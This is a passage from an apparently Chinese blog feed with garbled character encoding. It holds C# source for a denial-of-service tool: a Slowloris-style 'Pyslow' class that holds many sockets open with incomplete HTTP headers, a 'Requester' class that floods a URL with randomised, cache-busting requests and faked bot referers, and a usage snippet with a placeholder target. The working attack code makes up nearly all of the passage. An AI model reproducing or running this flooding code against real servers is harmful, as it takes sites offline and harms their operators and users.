class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Pyslow</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> tgt;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> port;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> to;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> threads;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> sleep;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span>[] method = &#123; <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span> &#125;;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> pkt_count;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Pyslow</span>(<span class="params"><span class="built_in">string</span> tgt, <span class="built_in">int</span> port, <span class="built_in">float</span> to, <span class="built_in">int</span> threads, <span class="built_in">int</span> sleep</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.tgt = tgt;</span><br><span class="line">            <span class="keyword">this</span>.port = port;</span><br><span class="line">            <span class="keyword">this</span>.to = to;</span><br><span class="line">            <span class="keyword">this</span>.threads = threads;</span><br><span class="line">            <span class="keyword">this</span>.sleep = sleep;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">MyPkt</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="built_in">string</span> text = method[random.Next(<span class="number">0</span>, method.Length)] + <span class="string">&quot; /&quot;</span> + random.Next(<span class="number">1</span>, <span class="number">999999999</span>).ToString() + <span class="string">&quot; HTTP/1.1\r\n&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;Host:&quot;</span> + tgt + <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;User-Agent:&quot;</span> +ds. AddUserAgent()[random.Next(<span class="number">0</span>, ds.AddUserAgent().Count)] + <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;Content-Length: 42\r\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> Encoding.ASCII.GetBytes(text);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Socket <span class="title">BuildingSocket</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Socket sock = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                pkt_count += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    sock.Send(MyPkt());</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception)</span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, <span class="number">-1</span>);</span><br><span class="line">                pkt_count += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    sock.Send(MyPkt());</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SendingPackets</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Socket sock = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                pkt_count += <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">byte</span>[] data = Encoding.ASCII.GetBytes(<span class="string">&quot;X-a: b\r\n&quot;</span>);</span><br><span class="line">                    sock.Send(data);</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception)</span><br><span class="line">            &#123;</span><br><span class="line">                sock = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (<span class="built_in">int</span>)to * <span class="number">1000</span>);</span><br><span class="line">                sock.Connect(<span class="keyword">new</span> IPEndPoint(IPAddress.Parse(tgt), port));</span><br><span class="line">                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, <span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">if</span> (sock.Connected)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">byte</span>[] data = Encoding.ASCII.GetBytes(<span class="string">&quot;X-a: b\r\n&quot;</span>);</span><br><span class="line">                    sock.Send(data);</span><br><span class="line">                    pkt_count += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoConnection</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> socks = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">int</span> fail = <span class="number">0</span>;</span><br><span class="line">            List&lt;Socket&gt; lsocks = <span class="keyword">new</span> List&lt;Socket&gt;();</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Blue;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\t\tBuilding sockets&quot;</span>);</span><br><span class="line">            Console.ResetColor();</span><br><span class="line">            <span class="keyword">while</span> (socks &lt; threads)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Socket sock = BuildingSocket();</span><br><span class="line">                    <span class="keyword">if</span> (sock != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        lsocks.Add(sock);</span><br><span class="line">                        socks++;</span><br><span class="line">                        <span class="keyword">if</span> (socks &gt; threads)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception)</span><br><span class="line">                &#123;</span><br><span class="line">                    fail++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Blue;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\t\tSending packets&quot;</span>);</span><br><span class="line">            Console.ResetColor();</span><br><span class="line">            <span class="keyword">while</span> (socks &lt; threads)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    SendingPackets();</span><br><span class="line">                    socks++;</span><br><span class="line">                    <span class="keyword">if</span> (socks &gt; threads)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception)</span><br><span class="line">                &#123;</span><br><span class="line">                    fail++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">            Console.Write(<span class="string">&quot;I have sent &quot;</span>);</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Cyan;</span><br><span class="line">            Console.Write(pkt_count.ToString());</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">            Console.Write(<span class="string">&quot; packets successfully.Now i&#x27;m going to sleep for &quot;</span>);</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">            Console.Write(sleep.ToString());</span><br><span class="line">            Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot; second&quot;</span>);</span><br><span class="line">            Thread.Sleep(sleep * <span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="httpç±»"><a href="#httpç±»" class="headerlink" title="httpç±»"></a>httpç±»</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Requester</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> tgt;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> ssl;</span><br><span class="line">    <span class="keyword">private</span> List&lt;HttpWebRequest&gt; req = <span class="keyword">new</span> List&lt;HttpWebRequest&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Requester</span>(<span class="params"><span class="built_in">string</span> tgt</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.tgt = tgt;</span><br><span class="line">        Uri url = <span class="keyword">new</span> Uri(tgt);</span><br><span class="line">        <span class="keyword">if</span> (url.Scheme == <span class="string">&quot;https&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ssl = <span class="literal">true</span>;</span><br><span class="line">            port = <span class="number">443</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ssl = <span class="literal">false</span>;</span><br><span class="line">            port = <span class="number">80</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; <span class="title">Header2</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; cachetype = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;no-store&quot;</span>, <span class="string">&quot;max-age=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;max-stale=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">100</span>).ToString(), <span class="string">&quot;min-fresh=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;notransform&quot;</span>, <span class="string">&quot;only-if-cache&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptEc = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;compress,gzip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;compress;q=0,5, gzip;q=1.0&quot;</span>, <span class="string">&quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptC = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;ISO-8859-1&quot;</span>, <span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;Windows-1251&quot;</span>, <span class="string">&quot;ISO-8859-2&quot;</span>, <span class="string">&quot;ISO-8859-15&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; bot = ds.AddBots();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> c = cachetype[random.Next(<span class="number">0</span>, cachetype.Count)];</span><br><span class="line">        <span class="built_in">string</span> a = acceptEc[random.Next(<span class="number">0</span>, acceptEc.Count)];</span><br><span class="line"></span><br><span class="line">        Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; http_header = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">        http_header.Add(<span class="string">&quot;User-Agent&quot;</span>, ds.AddUserAgent()[random.Next(<span class="number">0</span>, ds.AddUserAgent().Count)]);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Cache-Control&quot;</span>, c);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Accept-Encoding&quot;</span>, a);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Keep-Alive&quot;</span>, <span class="string">&quot;42&quot;</span>);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Host&quot;</span>, tgt);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Referer&quot;</span>, bot[random.Next(<span class="number">0</span>, bot.Count)]);</span><br><span class="line">        <span class="keyword">return</span> http_header;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebHeaderCollection <span class="title">Header</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; cachetype = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;no-store&quot;</span>, <span class="string">&quot;max-age=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;max-stale=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">100</span>).ToString(), <span class="string">&quot;min-fresh=&quot;</span> + random.Next(<span class="number">0</span>, <span class="number">10</span>).ToString(), <span class="string">&quot;notransform&quot;</span>, <span class="string">&quot;only-if-cache&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptEc = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;compress,gzip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;compress;q=0,5, gzip;q=1.0&quot;</span>, <span class="string">&quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; acceptC = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;ISO-8859-1&quot;</span>, <span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;Windows-1251&quot;</span>, <span class="string">&quot;ISO-8859-2&quot;</span>, <span class="string">&quot;ISO-8859-15&quot;</span> &#125;;</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; bot = ds.AddBots();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> c = cachetype[random.Next(<span class="number">0</span>, cachetype.Count)];</span><br><span class="line">        <span class="built_in">string</span> a = acceptEc[random.Next(<span class="number">0</span>, acceptEc.Count)];</span><br><span class="line"></span><br><span class="line">        WebHeaderCollection http_header = <span class="keyword">new</span> WebHeaderCollection();</span><br><span class="line">        http_header.Add(<span class="string">&quot;User-Agent&quot;</span>, ds.AddUserAgent()[random.Next(<span class="number">0</span>, ds.AddUserAgent().Count)]);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Cache-Control&quot;</span>, c);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Accept-Encoding&quot;</span>, a);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Keep-Alive&quot;</span>, <span class="string">&quot;42&quot;</span>);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Host&quot;</span>, tgt);</span><br><span class="line">        http_header.Add(<span class="string">&quot;Referer&quot;</span>, bot[random.Next(<span class="number">0</span>, bot.Count)]);</span><br><span class="line">        <span class="keyword">return</span> http_header;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">RandStr</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; mystr = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> x = <span class="number">0</span>; x &lt; <span class="number">3</span>; x++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">string</span> chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> text = <span class="keyword">new</span> <span class="built_in">string</span>(Enumerable.Repeat(chars, random.Next(<span class="number">7</span>, <span class="number">14</span>)).Select(s =&gt; s[random.Next(s.Length)]).ToArray());</span><br><span class="line">            mystr.Add(text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Join(<span class="string">&quot;&amp;&quot;</span>, mystr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">CreateUrl</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tgt + <span class="string">&quot;?&quot;</span> + RandStr();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Run</span>(<span class="params"><span class="built_in">string</span> method,<span class="built_in">int</span> count=<span class="number">1</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> _ <span class="keyword">in</span> Enumerable.Range(<span class="number">0</span>, count)) <span class="comment">// å¯ä»¥æ ¹æ®å®é™…éœ€æ±‚è°ƒæ•´å¾ªç¯æ¬¡æ•°ç­‰é€»è¾‘ï¼Œè¿™é‡Œç®€å•ç¤ºä¾‹å…ˆå¾ªç¯1æ¬¡</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//string method = new string[] &#123; &quot;GET&quot;, &quot;POST&quot; &#125;[new Random().Next(0, 2)];</span></span><br><span class="line">                <span class="comment">// å…ˆåˆ›å»ºåŒ…å«å®Œæ•´è¯·æ±‚URLï¼ˆåŒ…å«å‚æ•°ç­‰ï¼‰çš„Uriå¯¹è±¡</span></span><br><span class="line">                Uri requestUri = <span class="keyword">new</span> Uri(CreateUrl());</span><br><span class="line">                HttpWebRequest reqter;</span><br><span class="line">                <span class="keyword">if</span> (ssl)</span><br><span class="line">                &#123;</span><br><span class="line">                    reqter = (HttpWebRequest)WebRequest.Create(requestUri);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    reqter = (HttpWebRequest)WebRequest.Create(requestUri);</span><br><span class="line">                &#125;</span><br><span class="line">                reqter.Method = method;</span><br><span class="line">                <span class="keyword">using</span> (WebResponse response = reqter.GetResponse())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ å¯¹å“åº”å†…å®¹çš„å¤„ç†é€»è¾‘ï¼Œå½“å‰ä¸ºç©º</span></span><br><span class="line">                    Console.WriteLine(response.ContentLength.ToString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      <span class="built_in">string</span> target = <span class="string">&quot;xxx&quot;</span>;<span class="comment">// æ›¿æ¢ä¸ºå®é™…ç›®æ ‡IPæˆ–åŸŸå</span></span><br><span class="line">      <span class="built_in">int</span> port = xxx;</span><br><span class="line">      <span class="built_in">float</span> timeout = <span class="number">5.0f</span>;</span><br><span class="line">      <span class="built_in">int</span> threads = <span class="number">10</span>;</span><br><span class="line">      <span class="built_in">int</span> sleepTime = <span class="number">100</span>;</span><br><span class="line">      Pyslow pyslow = <span class="keyword">new</span> Pyslow(target, port, timeout, threads, sleepTime);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">          pyslow.DoConnection();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">      &#123;</span><br><span class="line">          Console.WriteLine(<span class="string">$&quot;å‘ç”Ÿå¼‚å¸¸: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span>/ åˆ›å»ºRequesterç±»çš„å®ä¾‹ï¼Œä¼ å…¥ç›®æ ‡URL</span></span><br><span class="line"><span class="comment">//Requester requester = new Requester(&quot;http://xxx/index.html&quot;); // http://xxx:16552</span></span><br><span class="line"><span class="comment">//try</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    // è°ƒç”¨Runæ–¹æ³•æ¥æ‰§è¡Œå‘é€è¯·æ±‚ç­‰ç›¸å…³æ“ä½œ</span></span><br><span class="line"><span class="comment">//    requester.Run(&quot;GET&quot;, 100);//POST</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//catch (Exception ex)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    Console.WriteLine($&quot;å‘ç”Ÿå¼‚å¸¸: &#123;ex.Message&#125;&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><!---https://learn.microsoft.com/en-us/dotnet/core/tools/global-tools-how-to-createconsole create--->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UDP-åŒ…å‘&quot;&gt;&lt;a href=&quot;#UDP-åŒ…å‘&quot; class=&quot;headerlink&quot; title=&quot;UDP åŒ…å‘&quot;&gt;&lt;/a&gt;UDP åŒ…å‘&lt;/h1&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="csharp" scheme="https://banjinmei.github.io/tags/csharp/"/>
    
  </entry>
  
  <entry>
    <title>å¬æ­Œè¯†æ›²</title>
    <link href="https://banjinmei.github.io/2024/12/10/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2/"/>
    <id>https://banjinmei.github.io/2024/12/10/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2/</id>
    <published>2024-12-10T14:33:56.000Z</published>
    <updated>2024-12-13T17:50:26.588Z</updated>
    
